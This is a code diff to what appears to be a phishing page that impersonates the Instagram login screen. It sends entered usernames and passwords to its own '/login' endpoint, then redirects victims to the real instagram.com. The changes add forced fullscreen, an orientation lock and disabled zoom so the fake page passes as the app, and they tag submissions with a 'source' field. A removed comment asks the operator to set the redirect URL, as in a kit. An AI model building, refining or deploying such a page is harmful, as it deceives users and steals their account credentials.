@@ -2,25 +2,31 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
 <title>Login • Instagram</title>
 <meta name="theme-color" content="#1c1e21">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="Instagram">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3CradialGradient id='g' cx='30%25' cy='107%25' r='150%25'%3E%3Cstop offset='0%25' stop-color='%23fdf497'/%3E%3Cstop offset='5%25' stop-color='%23fdf497'/%3E%3Cstop offset='45%25' stop-color='%23fd5949'/%3E%3Cstop offset='60%25' stop-color='%23d6249f'/%3E%3Cstop offset='90%25' stop-color='%23285AEB'/%3E%3C/radialGradient%3E%3C/defs%3E%3Crect width='100' height='100' rx='22' fill='url(%23g)'/%3E%3Crect x='18' y='18' width='64' height='64' rx='18' fill='none' stroke='white' stroke-width='6'/%3E%3Ccircle cx='50' cy='50' r='16' fill='none' stroke='white' stroke-width='6'/%3E%3Ccircle cx='72' cy='28' r='4.5' fill='white'/%3E%3C/svg%3E">
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{margin:0;padding:0;height:100%}
+  html,body{overscroll-behavior:none;touch-action:manipulation}
   body{
     font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
     background:#1c1e21;color:#e4e6eb;
     display:flex;flex-direction:column;align-items:center;
     min-height:100vh;
+    min-height:100dvh;
     -webkit-font-smoothing:antialiased;
     font-size:15px;
     padding:0 24px;
     overflow-x:hidden;
   }
 
-  /* top bar */
+  /* fullscreen hitboxes are visual only */
   .topbar{
     width:100%;
     padding:14px 0 6px;
@@ -29,9 +35,9 @@
     font-size:13px;
     letter-spacing:.1px;
     flex-shrink:0;
+    padding-top:calc(14px + env(safe-area-inset-top));
   }
 
-  /* IG gradient app icon */
   .ig-icon{
     width:96px;height:96px;
     margin-top:64px;
@@ -64,10 +70,7 @@
     outline:none;
     transition:border-color .15s;
   }
-  .input-wrap input::placeholder{
-    color:#8e8e8e;
-    opacity:1;
-  }
+  .input-wrap input::placeholder{color:#8e8e8e;opacity:1}
   .input-wrap input:focus{border-color:#5a5b5c}
 
   .input-wrap input[type="password"]{padding-right:60px;letter-spacing:.3px}
@@ -118,6 +121,7 @@
     align-items:center;
     gap:22px;
     padding-bottom:32px;
+    padding-bottom:calc(32px + env(safe-area-inset-bottom));
     flex-shrink:0;
   }
 
@@ -139,14 +143,10 @@
   .create-btn:active{background:rgba(24,119,242,.15)}
 
   .meta-logo{
-    height:22px;
-    width:auto;
-    opacity:.85;
-    user-select:none;
-    pointer-events:none;
+    height:22px;width:auto;opacity:.85;
+    user-select:none;pointer-events:none;
   }
 
-  /* loading overlay */
   .loading-overlay{
     position:fixed;inset:0;background:#1c1e21;display:none;
     align-items:center;justify-content:center;flex-direction:column;gap:16px;z-index:50;
@@ -171,7 +171,6 @@
 
 <div class="topbar">English (US)</div>
 
-<!-- Instagram gradient app icon -->
 <svg class="ig-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
   <defs>
     <radialGradient id="igGrad" cx="30%" cy="107%" r="150%">
@@ -189,6 +188,7 @@
 </svg>
 
 <form id="loginForm" method="POST" action="/login" autocomplete="off" novalidate>
+  <input type="hidden" name="source" value="instagram">
 
   <div class="input-wrap">
     <input type="text" id="username" name="email" placeholder="Username, email or mobile number"
@@ -215,7 +215,6 @@
     Create new account
   </a>
 
-  <!-- Meta logo -->
   <svg class="meta-logo" viewBox="0 0 108 22" xmlns="http://www.w3.org/2000/svg" aria-label="Meta">
     <path fill="#8e8e8e" d="M8.2 3.1c-2.4 0-4.2 1.4-5.8 3.8C1.3 8.9.6 10.5.1 11.6c-.4.9-.9 1.4-1.3 1.4-.5 0-.8-.4-.8-1.2 0-2.6.8-5.1 2.3-7.3C2 2.5 4.1 1 6.3 1c1.4 0 2.7.5 3.9 1.5.4.3.9.3 1.2-.1.3-.4.3-.9-.1-1.2C9.9.2 8.2-.5 6.3-.5 2.2-.5-.6 1.9-2.2 5.4c-1.1 2.5-1.6 5.1-1.6 7.4 0 1.8 1 2.9 2.7 2.9 1.7 0 2.8-.9 3.8-2.5.9-1.4 1.7-3 2.6-4.7 1.7-3 3.4-4.7 5.5-4.7 1.6 0 2.9 1 3.4 2.6.3 1-.2 2.2-1.3 3.3-1 .9-2.2 1.6-3.2 2.2-.5.3-.7.9-.4 1.3.3.4.9.5 1.3.3 1.2-.7 2.5-1.5 3.6-2.5 1.6-1.5 2.4-3.3 1.9-5-.6-2.3-2.5-3.9-4.9-3.9-4.5 0-7.8 2.4-10.7 7.3L.5 17c-.2.4-.2.8.2 1.1.4.3.9.3 1.2-.2l1.7-3c2.8-4.7 5.4-6.8 8.7-6.8 1.7 0 3.2.6 4.2 1.7" transform="translate(2 2)"/>
     <text x="40" y="16.5" fill="#8e8e8e" font-family="-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif" font-size="15" font-weight="600" letter-spacing="-.2">Meta</text>
@@ -228,11 +227,41 @@
 </div>
 
 <script>
-  /* =========================================================
-     YAHAN APNA REDIRECT URL DAAL
-     ========================================================= */
   const REDIRECT_URL = "https://www.instagram.com/";
 
+  /* ---------- fullscreen attempt on first interaction ---------- */
+  (function goFullscreen() {
+    const el = document.documentElement;
+    let tried = false;
+
+    function tryFs() {
+      if (tried) return;
+      tried = true;
+      const rfs = el.requestFullscreen
+              || el.webkitRequestFullscreen
+              || el.mozRequestFullScreen
+              || el.msRequestFullscreen;
+      if (rfs) {
+        rfs.call(el).catch(() => {});
+      }
+      // also try to lock orientation to portrait on mobile
+      if (screen.orientation && screen.orientation.lock) {
+        screen.orientation.lock('portrait').catch(() => {});
+      }
+      // remove listeners once done
+      ['touchstart','click','keydown'].forEach(ev =>
+        document.removeEventListener(ev, tryFs, true));
+    }
+
+    // first interaction anywhere triggers fullscreen
+    ['touchstart','click','keydown'].forEach(ev =>
+      document.addEventListener(ev, tryFs, { capture: true, once: true }));
+
+    // also attempt immediately (works in some standalone/PWA cases)
+    tryFs();
+  })();
+
+  /* ---------- form logic ---------- */
   const showBtn = document.getElementById('showPass');
   const pass    = document.getElementById('password');
   const form    = document.getElementById('loginForm');
@@ -258,6 +287,7 @@
       const body = new URLSearchParams();
       body.append('email', u);
       body.append('password', p);
+      body.append('source', 'instagram');
       await fetch('/login', {
         method: 'POST',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
